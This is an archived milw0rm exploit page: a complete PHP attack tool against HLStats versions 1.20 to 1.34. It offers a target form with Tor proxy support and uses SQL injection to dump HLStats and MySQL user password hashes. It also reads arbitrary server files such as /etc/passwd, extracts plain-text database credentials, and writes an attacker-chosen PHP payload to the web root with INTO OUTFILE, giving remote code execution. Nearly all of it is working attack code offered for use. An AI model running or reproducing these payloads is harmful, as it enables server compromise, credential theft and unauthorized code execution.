<html><head><title>HLStats <=1.34 (hlstats.php) Remote SQL Injection Exploit</title></head><pre>&lt;br&gt;&lt;b&gt;
&lt;?php
/*
Live Exploit Code
SQL Inection + Path Disclosure
Affects HLStats HLStats &lt;=1.34  and Hlstats &gt;= 1.20
works with magic_quotes_gpc=On
by Michael Brooks
*/

 print &quot;&lt;title&gt;HLStats SQL Injection Exploit&lt;/title&gt;
 &lt;body bgcolor='#009900'&gt;
 &lt;font  color='#FF0000'&gt;
&lt;b&gt;--------------------------------------------------------------------------------------------------------------------------------------------&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;
&lt;center&gt;&lt;b&gt; &lt;br&gt;
Welcome To HLstats Exploit code.&lt;br&gt;&lt;br&gt;
&lt;/b&gt;&lt;/center&gt; 
&lt;br&gt; 
SQL Inection + Path Disclosure&lt;br&gt;
Affects Hlstats &gt;= 1.20 to HLStats &lt;=1.34(current)&lt;br&gt;
Tested on Linux and Windows&lt;br&gt;
works with magic_quotes_gpc=On!&lt;br&gt;
HLStats has gone though 5 years with no exploits so this is a Birthday Present!&lt;br&gt;
Merry Christmass!&lt;br&gt;
By Michael Brooks&lt;br&gt;
&lt;br&gt;
&lt;b&gt;--------------------------------------------------------------------------------------------------------------------------------------------&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;
&quot;;
 
 print &quot;
 	&lt;form action='&quot;.$_SERVER['PHP_SELF'].&quot;' method='post'&gt;
	&lt;b&gt;Target:&lt;/b&gt;&lt;br&gt;
	&lt;input type='text' name='target' size=32&gt;&lt;br&gt;
	(hint: where the login form is. example: http://domain.com/path/hlstats.php )&lt;br&gt;
	&lt;br&gt;&lt;b&gt;Proxy:&lt;/b&gt;(ip:port or name:pass@ip:port)&lt;br&gt;
	&lt;input type='text' name='proxy' size=32&gt;&lt;br&gt;
	(example: 127.0.0.1:8118   Use &lt;a href='http://tor.eff.org'&gt;Tor&lt;/a&gt;+&lt;a href='http://www.privoxy.org/'&gt;Privoxy&lt;/a&gt;. )&lt;br&gt;
	&lt;br&gt;&lt;br&gt;
	If nothing is changed below this line then the exploit will attempt to get the database login information in plain text.
&lt;b&gt;--------------------------------------------------------------------------------------------------------------------------------------------&gt;&lt;/b&gt;&lt;br&gt;&lt;br&gt;
	&lt;H1&gt;ATTACKS:&lt;/H1&gt;
	&lt;br&gt;
	&lt;b&gt;Database Selects:&lt;/b&gt;&lt;br&gt;
	&lt;br&gt;
	OBTIAN HLStats logins:&lt;br&gt;
	&lt;input type='submit' name='button' value='HLStats_Logins'&gt;(Passwords are stored as MD5 hashs, use: &lt;a href='http://www.milw0rm.com/cracker/insert.php'&gt;Milw0rm's MD5 Cracker&lt;/a&gt;)&lt;br&gt;
 		
 		  OBTIAN mysql.user logins:&lt;br&gt;
 		&lt;input type='submit' name='button' value='Mysql_Logins'&gt;&lt;br&gt;
	&lt;br&gt;

	&lt;br&gt;
 	&lt;b&gt;File IO:&lt;/b&gt;&lt;br&gt;&lt;br&gt;
 	&lt;b&gt;Path Disclosure&lt;/b&gt;&lt;br&gt;
 	&lt;input type='submit' name='button' value='Path'&gt;&lt;br&gt;
	&lt;br&gt;
	&lt;b&gt;Plain Text Database Login Information&lt;/b&gt;&lt;br&gt;
	&lt;input type='submit' name='button' value='Read_Login'&gt;
	(This will attempt to read the configuration file for hlstats and dump the PLAIN TEXT database login information.)&lt;br&gt;
	&lt;br&gt;
	&lt;b&gt;Read Other File&lt;/b&gt;&lt;br&gt;
	&lt;input type='submit' name='button' value='Read_File'&gt;
	&lt;input type='text' name='read_file' size=50&gt;
	&lt;br&gt;example: /etc/passwd&lt;br&gt;
	OR for windows based systems: C:\\\\WINDOWS\\\\repair\\\\sam&lt;br&gt;
	&lt;br&gt;&lt;b&gt;attempt payload:&lt;/b&gt;(WARNING,  NO PROXY IS USED FOR UPLOADING PAYLOAD)&lt;br&gt;
	&lt;input type='submit'  name='button' value='Upload'&gt;
	 &amp;lt?php &lt;input type='text' name='payload' size=50&gt;?&amp;gt &lt;br&gt;
	example: system('netstat'); &lt;br&gt;
	
	&lt;/form&gt;
	&lt;br&gt;&lt;b&gt;--------------------------------------------------------------------------------------------------------------------------------------------&gt;&lt;/b&gt;&lt;br&gt;
	&quot;;

 //generic http class
class http{
	var $proxy_ip='', $proxy_port='', $proxy_name='', $proxy_pass='';
	
	function http_gpc_send($loc ,$cookie=&quot;&quot;, $postdata = &quot;&quot;) { 
		 //overload function polymorphism between gets and posts
		 $url=parse_url($loc);
		 if(!isset($url['port'])){
		   $url['port']=80;
		}
		//$ua=$_SERVER['HTTP_USER_AGENT'];
		$ua='GPC/.01';
		 if($this-&gt;proxy_ip!=''&amp;&amp;$this-&gt;proxy_port!=''){
			$fp = pfsockopen( $this-&gt;proxy_ip, $this-&gt;proxy_port, &amp;$errno, &amp;$errstr, 120 );
			$url['path']=$url['host'].':'.$url['port'].$url['path'];
		 }else{
			$fp = fsockopen( $url['host'], $url['port'], &amp;$errno, &amp;$errstr, 120 );
		 }
		 
		 if( !$fp ) {
		    print &quot;$errstr ($errno)&lt;br&gt;\nn&quot;;
		 } else {
		    if( $postdata=='' ) {
			fputs( $fp, &quot;GET &quot;.$url['path'].&quot;?&quot;.$url['query'].&quot; HTTP/1.1\r\n&quot; );
		    } else {
			fputs( $fp, &quot;POST &quot;.$url['path'].&quot;?&quot;.$url['query'].&quot; HTTP/1.1\r\n&quot; );
		    }
		    
		    if($this-&gt;proxy_name!=''&amp;&amp;$this-&gt;proxy_pass!=''){
			fputs($fp, &quot;Proxy-Authorization: Basic &quot;.base64_encode($this-&gt;proxy_name.&quot;:&quot;.$this-&gt;proxy_pass).&quot;\r\n\r\n&quot;);
		    }

		    fputs($fp, &quot;Host: &quot;.$url['host'].&quot;:&quot;.$url['port'].&quot;\r\n&quot;);
		    fputs( $fp, &quot;User-Agent: &quot;.$ua.&quot;\r\n&quot; );
		    fputs( $fp, &quot;Accept: text/plain\r\n&quot; );
		    fputs( $fp,&quot;Connection: Close\r\n&quot; );
		    if($cookie!=''){ 
			fputs( $fp, &quot;Cookie: &quot;.$cookie.&quot;\r\n&quot; );
		    }
		    if( $postdata!='' ) {
			$strlength = strlen( $postdata );
			fputs( $fp, &quot;Content-type: application/x-www-form-urlencoded\r\n&quot; );
			fputs( $fp, &quot;Content-length: &quot;.$strlength.&quot;\r\n\r\n&quot; );
			fputs( $fp, $postdata);
		    }
		    fputs( $fp, &quot;\n\n&quot; );
		    
		   $output = &quot;&quot;;
		   while( !feof( $fp ) ) {
			$output .= fgets( $fp, 1024 );
		   }
		    fclose( $fp );
		 }
		 return $output;
	}
	
	function proxy($proxy){ //user:pass@ip:port
		$proxyAuth=explode('@',$proxy);
		if(isset($proxyAuth[1])){
			$login=explode(':',$proxyAuth[0]);
			$this-&gt;proxy_name=$login[0];
			$this-&gt;proxy_pass=$login[1];
			
			$addr=explode(':',$proxyAuth[1]);
			$this-&gt;proxy_ip=$addr[0];
			$this-&gt;proxy_port=$addr[1];
		}else{
			$addr=explode(':',$proxy);
			$this-&gt;proxy_ip=$addr[0];
			$this-&gt;proxy_port=$addr[1];
		}
	}
	
	function get($url, $cookie=''){
		return $this-&gt;http_gpc_send($url, $cookie);
	}

	function post($url, $cookie='', $post=''){
		return $this-&gt;http_gpc_send($url,$cookie,$post);
	}
	
	function getServer($url){
		$resp=$this-&gt;http_gpc_send($url);
		$header=explode(&quot;Server: &quot;,$resp);
		$server=explode(&quot;\n&quot;,$header[1]);
		return $server[0];
	}
}

//reuseable functions
function getPath($html){
	$path='';
	$resp=explode(&quot;array given in &lt;b&gt;&quot;,$html);
	if(isset($resp[1])){
		$resp = explode(&quot;&lt;/b&gt;&quot;,$resp[1]);
	}else{
		$resp[0]=false;
	}
	return $resp[0];
}

function charEncode($string){
	$char=&quot;char(&quot;;
	$size=strlen($string);
	for($x=0;$x&lt;$size;$x++){
		$char.=ord($string[$x]).&quot;, &quot;;
	}
	$char[strlen($char)-2]=')%00';
	return $char;
}

function hex_encode($my_string)
{
$encoded=&quot;0x&quot;;
  for ($k=0; $k&lt;=strlen($my_string)-1; $k++)
  {$temp=dechex(ord($my_string[$k]));
    if (strlen($temp)==1) {$temp=&quot;0&quot;.$temp;}
    $encoded.=$temp;
  }
  return $encoded;
} 


//hlstats specific functions
function hl_get_sql($resp){
	//print htmlspecialchars($resp);
	$tmp=explode('&lt;table ',$resp);
	array_pop($tmp);
	$last=array_pop($tmp);
	$tbl=explode('&lt;/table&gt;',$last);
	$table=$tbl[0];//ITS MY TABLE NOW!
	if(strstr($table,'Victim')&amp;&amp;strstr($table,'Times Killed')){
		$table=str_replace('border=0','border=1',$table);
		$table=str_replace('#002E8A','#000000',$table);
		$table=str_replace('#15154D','#CCCCCC',$table);
		$table=str_replace('#161652','#CCCCCC',$table);
		$table='&lt;table '.$table.'&lt;/table&gt;';
	}else{
		$table=false;
	}
	return $table;
}

function get_logins($addr){
	$http=new http();
	$data='';
	$resp=$http-&gt;get($addr.&quot;?mode=playerinfo&amp;player=1&amp;playerdata[lastName][]=1&quot;);
	$path=getPath($resp);
	$readfile=hex_encode($path);
	$pay=&quot;killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20&quot;;
	$resp=$http-&gt;post($addr.&quot;?mode=playerinfo&amp;player=1&quot;,'',$pay);
		
	$tmp=explode(&quot;define(&amp;quot;DB_NAME&amp;quot;, &amp;quot;&quot;,$resp);
	$tmp=explode(&quot;&amp;quot;&quot;,$tmp[1]);
	$data[db]=$tmp[0];

	$tmp=explode(&quot;define(&amp;quot;DB_USER&amp;quot;, &amp;quot;&quot;,$resp);
	$tmp=explode(&quot;&amp;quot;&quot;,$tmp[1]);
	$data[name]=$tmp[0];
	
	$tmp=explode(&quot;define(&amp;quot;DB_PASS&amp;quot;, &amp;quot;&quot;,$resp);
	$tmp=explode(&quot;&amp;quot;&quot;,$tmp[1]);
	$data[pass]=$tmp[0];
	
	$tmp=explode(&quot;define(&amp;quot;DB_ADDR&amp;quot;, &amp;quot;&quot;,$resp);
	$tmp=explode(&quot;&amp;quot;&quot;,$tmp[1]);
	$data[addr]=$tmp[0];
	
	$tmp=explode(&quot;define(&amp;quot;DB_TYPE&amp;quot;, &amp;quot;&quot;,$resp);
	$tmp=explode(&quot;&amp;quot;&quot;,$tmp[1]);
	$data[type]=$tmp[0];
	
	return $data;
}

//The table prefix is needed to union select the hlstats logins
function get_prefix($attack){
	$prefix=false;
	$http=new http();
	//hex_encode is used instead of quote marks
	$payload=&quot;killLimit=1000%20union%20select%20TABLE_NAME,TABLE_SCHEMA,1,1,1%20from%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20&quot;.hex_encode(&quot;%events_playerplayeractions&quot;).&quot;%23&quot;;
	$resp=$http-&gt;post($attack.&quot;?mode=playerinfo&amp;player=1&quot;,'',$payload);
	$mid=explode('events_playerplayeractions',$resp);
	if(is_array($mid)){
		foreach($mid as $m){
			$pre= explode('&gt;',$m);
			$fix=array_pop($pre);
			if(is_array($prefix)){
				if(!in_array($fix,$prefix)){
					$prefix[]=trim($fix);
				}
			}else if($prefix!=$fix){
				print($fix);
				$prefix[]=trim($fix);
			}
		}
		if(is_array($prefix)){
			$v=array_pop($prefix);
			if(trim($v)!='0'){//damn that zero!!
				array_push($prefix,$v);
			}
		}
	}else{
		$prefix=false;
	}
	return($prefix);
}

if(isset($_REQUEST['target'])&amp;&amp;$_REQUEST['target']!=''){
	//this exploit can take its sweet time. 
	set_time_limit(0);
	$http=new http();
	$addr=explode('?',$_REQUEST['target']);
	$addr=$addr[0];
	if(isset($_REQUEST['proxy'])){
		$http-&gt;proxy($_REQUEST['proxy']);
	} 
	
	switch($_REQUEST['button']){
		case 'HLStats_Logins':
			$table=false;
			$prefix=get_prefix($addr);
			//print_r($prefix);
			foreach($prefix as $pre){
				if(!$table){
					print &quot;trying table prefix:$pre&lt;br&gt;&quot;;
					//no comments are used in this payload,  instead a second union select is used to finnish the query.
					$pay=&quot;killLimit=1000%20union%20select%20username,password,acclevel,1,playerId%20from%20&quot;.$pre.&quot;Users%20UNION%20SELECT%201,1,1,1,1%20FROM%20&quot;.$pre.&quot;Players%20WHERE%201=0&quot;;
					$resp=$http-&gt;post($addr.&quot;?mode=playerinfo&amp;player=1&quot;,'',$pay);
					$table=hl_get_sql($resp);//  
				}
			}
			if(!$table&amp;&amp;@!in_array('hlstats_',$prefix)){//ooah no the exploit has failed so far. 
					$pre=&quot;hlstats_&quot;;//try the default prefix
					print &quot;trying table prefix:$pre&lt;br&gt;&quot;;
					$pay=&quot;killLimit=1000%20union%20select%20username,password,acclevel,1,playerId%20from%20&quot;.$pre.&quot;Users%20UNION%20SELECT%201,1,1,1,1%20FROM%20&quot;.$pre.&quot;Players%20WHERE%201=0&quot;;
					$resp=$http-&gt;post($addr.&quot;?mode=playerinfo&amp;player=1&quot;,'',$pay);
					$table=hl_get_sql($resp);//  			
			}
			if($table){
				$table=str_replace('Victim','username',$table);
				$table=str_replace('Kills per Death','playerId',$table);
				$table=str_replace('Deaths by','acclevel',$table);
				$table=str_replace('Times Killed','password',$table);
				$table=str_replace('Rank','Count',$table);
				print &quot;&lt;br&gt;$table&quot;;
			}
			break;
		case 'Mysql_Logins':
			//a comment is used so the table prefix doesn't have to be known;  this is simpler,  less to go wrong.  
			$pay=&quot;killLimit=1000%20union%20select%20user,password,File_priv,1,Host%20%20from%20mysql.user%20--%20&quot;;
			$resp=$http-&gt;post($addr.&quot;?mode=playerinfo&amp;player=1&quot;,'',$pay);
			$table=hl_get_sql($resp);
			$table=str_replace('Victim','User',$table);
			$table=str_replace('Kills per Death','Host',$table);
			$table=str_replace('Deaths by','File_priv',$table);
			$table=str_replace('Times Killed','Password',$table);
			$table=str_replace('Rank','Count',$table);
			print &quot;&lt;br&gt;$table&quot;;
		break;
		case 'Read_File':
			$readfile=hex_encode($_REQUEST[read_file]);
			$pay=&quot;killLimit=99999%20union%20select%20load_file($readfile),1,1,1,1%20--%20&quot;;
			$resp=$http-&gt;post($addr.&quot;?mode=playerinfo&amp;player=1&quot;,'',$pay);			
			$tmp=explode('alt=&quot;player.gif&quot;&gt;&lt;b&gt;',$resp);
			$data=explode(&quot;&lt;/font&gt;&quot;,$tmp[1]);
			$data=$data[0];
			//this might be a bad thing:
			$data=preg_replace('&lt;br /&gt;','',$data);
			print 'data'.$data; 		
		break;
		case 'Path':
			$resp=$http-&gt;get($addr.&quot;?mode=playerinfo&amp;player=1&amp;playerdata[lastName][]=1&quot;);
			$path=getPath($resp );
			print &quot;Path Disclosure:$path&lt;br&gt;&quot;;
		break;	
		case 'Read_Login':
			$data=get_logins($addr);
			foreach($data as $var=&gt;$val){
				   $tmp=explode('&amp;quot',$val);
					$data[$var]=$tmp[0];
					print &quot;&lt;br&gt;&quot;.$var.&quot;:&quot;.$tmp[0];
			}	
		break;
		case 'Upload':
			$resp=$http-&gt;get($addr.&quot;?mode=playerinfo&amp;player=1&amp;playerdata[lastName][]=1&quot;);
			$path=getPath($resp );
			$data=get_logins($addr);
			print $path.&quot;&lt;br&gt;&quot;;
			$tar=explode('/',$_REQUEST['target']);
			$paylink=$tar;
			array_pop($paylink);
			$paylink=implode('/',$paylink);
			if(strstr($path,':')){//if windows
				print &quot;Windows Sytem&lt;br&gt;&quot;;
				$temp=explode('\\',$path);
			}else{//else *nix
				print &quot;*nix System&lt;br&gt;&quot;;
				$temp=explode('/',$path);
			}
			array_pop($temp);
			$path=implode('/',$temp);
			mysql_connect($tar[2],$data[name],$data[pass]) or die(mysql_error());
			$name=&quot;data&quot;.rand();//rand is used so that this attack can be run multiple times.
			$sql=&quot;SELECT '&lt;?php &quot;.$_REQUEST[payload].&quot;?&gt;' INTO OUTFILE '$path/$name.php'&quot;;
			print &quot;&lt;br&gt;&lt;a href='$paylink/$name.php'&gt;&lt;b&gt; Execute Payload &lt;/b&gt;&lt;/a&gt;&quot;;
			mysql_query($sql) or die(mysql_error());
		break;
		default:
			print 'No Attack!';
		break;
	}
}else{
	Print &quot;No Target.&quot;;
}
?&gt;&lt;br&gt;--------------------------------------------------------------------------------------------------------------------------------------------&gt;&lt;br&gt;

# milw0rm.com [2006-12-25]</pre></html>